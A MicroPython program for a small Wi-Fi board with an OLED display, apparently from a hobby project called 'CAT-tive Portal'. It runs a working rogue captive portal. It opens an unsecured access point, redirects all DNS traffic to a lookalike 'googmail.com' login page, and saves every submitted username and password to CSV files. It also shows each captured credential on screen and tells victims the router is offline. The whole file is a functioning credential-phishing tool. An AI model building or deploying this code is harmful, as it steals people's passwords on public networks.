import _thread
import json
import os
import network
import time
from machine import Pin, I2C
import ssd1306
from phew import server
from phew.dns import run_catchall
from phew.logging import disable_logging_types, LOG_ALL

# Disable phew logging
# disable_logging_types(LOG_ALL)

#Project Info
VERSION = 1.1
ARTHUR = 'Jael Gonzalez'
GITHUB = 'https://github.com/Jael-G/CAT-tive-Portal/'

# Hardware setup
#Change scl and sda pins to match hardware
i2c = I2C(0, scl=Pin(35), sda=Pin(33))
oled_width = 64 #128
oled_height = 48 #64
oled = ssd1306.SSD1306_I2C(oled_width, oled_height, i2c)
    
# Variables
start_time = time.time()
direction = 1
count = 0
captured_time = 0
WAITING = True
last_capture = {}
amount_of_captures = 0
DOMAIN = 'googmail.com'
amount_of_previous_capture_files = len(os.listdir("captures")) + 1
last_connection_update = time.time()
connections = 0

UPDATE_TIME = 7
CAPTURE_DISPLAY_TIME = 7
MAX_CHAR_LENGTH = 16

# Loading animations and files
with open("animations/cat_sleeping.json", "r") as cat_sleeping_file:
    cat_sleeping_animation = json.load(cat_sleeping_file)

with open("animations/cat_captures.json", "r") as cat_captured_file:
    cat_captured_animation = json.load(cat_captured_file)

#Both animatiosn have the same amount of frames
FRAMES_NUM = len(cat_sleeping_animation)


#Create new file each session
with open(f"captures/capture_{amount_of_previous_capture_files}.csv", "w") as captures_file:
    print("File made")
    captures_file.write("username,password,website\n")


'''
The html file is being preloaded and saved as Response.
That way, it doesn't have to be opened everytime it is
server (when using render_template)
'''
with open("templates/goog.html", "r") as html_file:
    LOGIN_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body=html_file.read())

# Default response when someone logs in
SUCCESS_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body="Router is offline right now, try again another time.")

# Animation function
def animate():
    global VERSION, oled, cat_sleeping_animation, cat_captured_animation, direction, count, FRAMES_NUM, wlan_AP_IF, connections, UPDATE_TIME, MAX_CHAR_LENGTH
    global captured_time, WAITING, last_capture, amount_of_captures, start_time, amount_of_previous_capture_files, last_connection_update, CAPTURE_DISPLAY_TIME
    
    while True:
        oled.fill(1)
        
        #Top bar
        oled.rect(0, 0, 128, 15, 0, True)
        oled.text(f"v{VERSION}",0,55,0)
        
        

                
        #Executed while waiting for a capture
        if WAITING:
            
            '''
            Check if there exists any connections to the access point
            Set to check every 10 seconds, having it run on the main
            loop every 0.5 seconds overwhelm the interface
            '''
            if time.time() - last_connection_update > UPDATE_TIME:
                last_connection_update = time.time()
                connections = len(wlan_AP_IF.status("stations"))

            
            oled.text(f"{{{connections:02d}}}", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
            
            #Calculate uptime and display it in hh:mm:ss
            current_time = time.time() - start_time  
            hours = int(current_time // 3600)
            minutes = int((current_time % 3600) // 60)
            seconds = int(current_time % 60)

            oled.text(f"({amount_of_captures:02})", 0, 5, 1)
            oled.text(f"UP{hours:02d}:{minutes:02d}:{seconds:02d}", 45, 5, 1)
            
            #Formatting to show a '-' at the end if text don't fit
            if len(wlan_AP_IF.config('essid')) > MAX_CHAR_LENGTH:
                formatted_ap_name = wlan_AP_IF.config('essid')[:15] + '-'
            else:
                formatted_ap_name = wlan_AP_IF.config('essid')
                
            oled.text(f"{formatted_ap_name}", 0, 19, 0)
            oled.text(f"CH {wlan_AP_IF.config('channel')}", 0, 28, 0)
            oled.text(f"AU {wlan_AP_IF.config('authmode')}", 0, 37, 0)
            frame_content = cat_sleeping_animation[count]
            
        #Executed when a capture is made
        else:
            frame_content = cat_captured_animation[count]
            oled.text(f"({amount_of_captures:02}) {last_capture['website']}", 0, 5, 1)
            oled.text(f"[{amount_of_previous_capture_files:02d}]", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
            
            #Formatting to show a '-' at the end if text don't fit
            if len(last_capture['username']) > MAX_CHAR_LENGTH:
                formatted_username = last_capture['username'][:15] + '-'
            else:
                formatted_username = last_capture['username'][:15]

            if len(last_capture['password']) > MAX_CHAR_LENGTH:
                formatted_password = last_capture['password'][:15] + '-'
            else:
                formatted_password = last_capture['password']

            oled.text(formatted_username, 0, 19, 0)
            oled.text(formatted_password, 0, 28, 0)
            
            #Display the capture for 5 seconds
            if time.time() - captured_time >  CAPTURE_DISPLAY_TIME:
                WAITING = True
                last_capture = {}
                
        #Iterate trough grid and show pixels accordingly
        for i in range(len(frame_content)):
            if frame_content[i] == []:
                continue

            for x_value in frame_content[i]:
                oled.pixel(x_value, i, 0)

        time.sleep(0.5)
        oled.show()

        count = (count + direction) % FRAMES_NUM
        
        #Count that swtiches direction without repeating the last count
        #i.e 0,1,2,1,0,1,2...
        if count == 0 and direction == -1:
            direction = 1
        elif count == FRAMES_NUM - 1 and direction == 1:
            direction = -1


#################SERVER CODE#################

'''
Authmodes
* 0 || network.AUTH_OPEN         -- OPEN 
* 1 || network.AUTH_WEP          -- WEP
* 2 || network.AUTH_WPA-PSK      -- WPA-PSK
* 3 || network.AUTH_WPA2_PSK     -- WPA2-PSK
* 4 || network.AUTH_WPA_WPA2_PSK -- WPA/WPA2-PSK
'''
# Setting up server and access point
ACCESS_POINT_ESSID = "WifiPortal"
PASSWORD = ''
CHANNEL = 4
AUTHMODE = network.AUTH_OPEN
wlan_AP_IF = network.WLAN(network.AP_IF)
wlan_AP_IF.active(True)


wlan_AP_IF.config(essid=ACCESS_POINT_ESSID, password=PASSWORD, channel=CHANNEL, authmode=AUTHMODE)

@server.route("/login", methods=["GET", "POST"])
def login_page(request):
    global captured_time, WAITING, last_capture, amount_of_captures, DOMAIN
           
    if request.method == "GET":
        return LOGIN_RESPONSE
    else:
        if request.form:
            username = request.form['username']
            password = request.form['password']
            website = request.form['website']

            with open(f"captures/capture_{amount_of_previous_capture_files}.csv", "a") as captures_file:
                captures_file.write(f"{username},{password},{website}\n")

        captured_time = time.time()
        last_capture = request.form
        amount_of_captures += 1
        WAITING = False

        return SUCCESS_RESPONSE

#DNS catchall to redirect every request
@server.catchall()
def catchall(request):
    return server.redirect("http://" + DOMAIN + "/login")

# Running threads and server
_thread.start_new_thread(animate, [])
run_catchall(wlan_AP_IF.ifconfig()[0])
server.run()


